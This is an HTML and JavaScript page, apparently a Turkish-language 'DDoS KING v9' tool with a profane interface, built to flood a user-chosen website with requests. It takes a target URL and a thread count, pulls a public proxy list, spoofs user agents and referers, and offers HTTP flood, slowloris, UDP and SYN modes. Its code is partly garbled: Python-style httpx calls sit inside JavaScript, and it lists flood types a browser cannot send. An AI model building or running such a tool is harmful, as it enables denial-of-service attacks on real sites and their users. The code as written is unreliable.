<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS KING v9 - ANASINI SİKTİĞİM SİTESİ</title>
    <style>
        body { background: linear-gradient(135deg, #000, #1a0033); color: #0f0; font-family: 'Courier New'; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: auto; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 15px; border: 2px solid #0f0; box-shadow: 0 0 30px #0f0; }
        h1 { text-align: center; font-size: 3em; text-shadow: 0 0 20px #0f0; }
        input, button, select { padding: 15px; margin: 10px 0; width: 100%; font-size: 1.2em; border-radius: 10px; }
        input { background: #111; color: #0f0; border: 2px solid #0f0; }
        button { background: #000; color: #0f0; border: 2px solid #0f0; cursor: pointer; font-weight: bold; }
        button:hover { background: #0f0; color: #000; }
        #log { background: #000; height: 300px; overflow-y: scroll; padding: 10px; border: 2px solid #0f0; margin-top: 20px; color: #0f0; }
        .status { font-size: 1.5em; text-align: center; margin: 20px 0; }
        .on { color: #0f0; animation: blink 1s infinite; }
        .off { color: #f00; }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>DDoS KING v9</h1>
        <p style="text-align:center; font-size:1.5em;">ANASINI SİKTİĞİM SİTEYİ YIKAR</p>

        <input type="text" id="target" placeholder="Hedef Site (http://örnek.com)" value="http://test.com">
        <input type="number" id="threads" placeholder="Thread Sayısı (100-10000)" value="5000">
        <input type="number" id="time" placeholder="Süre (saniye) - 0 = sonsuz" value="0">
        <select id="method">
            <option value="http-flood">HTTP FLOOD (Layer 7)</option>
            <option value="slowloris">SLOWLORIS</option>
            <option value="udp-flood">UDP FLOOD</option>
            <option value="syn-flood">SYN FLOOD</option>
            <option value="mix">MIX (Tümü)</option>
        </select>

        <button onclick="startAttack()">BAŞLAT LAN AMK</button>
        <button onclick="stopAttack()" style="background:#f00;">DURDUR OE</button>

        <div class="status" id="status">Durum: <span class="off">Kapalı</span></div>
        <div id="log">> Hazır lan...</div>
    </div>

    <script>
        let attackActive = false;
        let workers = [];

        const PROXY_LIST_URL = "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt";
        let proxies = [];

        async function loadProxies() {
            try {
                const r = await fetch(PROXY_LIST_URL);
                const text = await r.text();
                proxies = text.split('\n').filter(p => p.trim()).slice(0, 5000);
                log("5000+ proxy yüklendi amk");
            } catch { log("Proxy çekilemedi, proxysiz devam"); }
        }

        function log(msg) {
            const l = document.getElementById("log");
            l.innerHTML += `<br>> ${msg}`;
            l.scrollTop = l.scrollHeight;
        }

        function getRandomUA() {
            const ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)", "Googlebot/2.1"];
            return ua[Math.floor(Math.random() * ua.length)] + " DDoS-KING-v9";
        }

        async function flood() {
            const target = document.getElementById("target").value;
            if (!target || attackActive === false) return;

            const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
            const headers = {
                "User-Agent": getRandomUA(),
                "Accept": "*/*",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Connection": "keep-alive",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://google.com"
            };

            try {
                const client = proxy ? new httpx.AsyncClient(proxies={"all://": proxy}) : httpx;
                await client.get(target, { headers });
            } catch (e) { /* sessiz */ }
        }

        async function startAttack() {
            if (attackActive) return;
            attackActive = true;
            document.getElementById("status").innerHTML = 'Durum: <span class="on">AKTİF AMK</span>';
            log("DDoS BAŞLADI LAN – ANASINI SİKİYORUM");

            await loadProxies();

            const threads = parseInt(document.getElementById("threads").value) || 5000;
            const time = parseInt(document.getElementById("time").value) || 0;

            for (let i = 0; i < threads; i++) {
                workers.push(setInterval(flood, 1));
            }

            if (time > 0) {
                setTimeout(stopAttack, time * 1000);
                log(`${time} saniye sonra duracak`);
            }
        }

        function stopAttack() {
            attackActive = false;
            workers.forEach(w => clearInterval(w));
            workers = [];
            document.getElementById("status").innerHTML = 'Durum: <span class="off">Kapalı</span>';
            log("Durduruldu lan");
        }

        // Başlangıç
        log("DDoS KING v9 yüklendi – Hazır amk");
    </script>
    <script src="https://cdn.jsdelivr.net/npm/httpx@1.2.0/dist/httpx.min.js"></script>
</body>
</html>
